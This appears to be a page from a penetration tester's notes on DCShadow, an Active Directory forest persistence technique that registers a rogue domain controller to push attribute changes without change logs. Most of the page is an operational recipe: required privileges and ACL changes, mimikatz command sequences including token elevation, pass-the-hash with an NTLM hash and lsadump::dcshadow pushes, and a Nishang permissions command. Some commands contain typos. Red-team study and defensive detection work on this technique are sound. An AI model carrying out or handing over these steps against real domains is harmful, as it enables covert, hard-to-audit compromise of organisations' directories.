# AD - Forest Persistence - DCShadow

## Description

* DCShadow registers temporarily a new DC in the target domain and uses it to "push" attributes likes SIDHisotry, SPN etc. on a specific object. Without leaving change logs for modified object
* The new DC is registered by modifying the Configuration container, SPN of an existing computer object where the attackers runs the attack from and couple of RPC services
* Because the attribute are changed from a "DC", there are no dictory change logs on the actual DC for the target object.&#x20;
* What exactly was changed using DCShadow would not be visible, other Logs etc. of course will be generated

### Requirement

* Be default DA privs are required to use DCSHadow
* The attacker's machine must be part fo the root domain => If you have a Forest - you need to be DA on the forest
* Two mimikatz instances
*   DCShadow with minimal permissions by modifying the ACLS of:

    * Domain Object\
      DS-InstallReplica (Add-Remove Replica in Domain)\
      DS-Replication-Manage-Topology (Manage Replication Technology)\
      DS-Replication-Sychronize (Replication Synchronization)
    * The Sites object (and its children) in the Configuraiton container\
      CreateChild and DeleteChild
    * The object of the computer which is registered as a DC\
      WriteProperty (Not Write)
    * The target object\
      WriteProperty (Not Write)

    \==> Use _Set-DCShadowPermissions from Nishang_ for setting the permissions

### Tool

**Process**\
One mimikatz instance to start RPC server with SYSTEM privs and specific attributes set:\
!+\
!processtoken\
token::whoami\
lsadump::dcshadow /object:targetUsername /attrubte:Description /value="New Value of Description"\
&#x20;  this will set a new description for the user\
PowerView: Get-NetUser targetUsername\


Second mimikatz instance with enough privs (DA or otherwise like minimal permissions) to push the values:\
Start mimikatz.exe because Invoke-Mimikatz does not show proper output for dcshadow\
privilege::debug\
sekurlsa:pth /user:Administrator /domain:dom.local /ntlm:hash /impersonate\
lsadump::dcshadow /push\
token::whoami

**Using Nishang to set minimal Permissions to target object / Use DCShadow as user currentuser to modify username1 object from machine attacker-machine-hostname**

{% code overflow="wrap" %}
```
Set-DCShadowPermissions -FakeDC attacker-machine-hostname -samaccountname username1 -username currentuser -verbose 
==> now only 1 Mimikatz sessions is requried because username1 can be used and only do lsadump::dcshadow /push
```
{% endcode %}
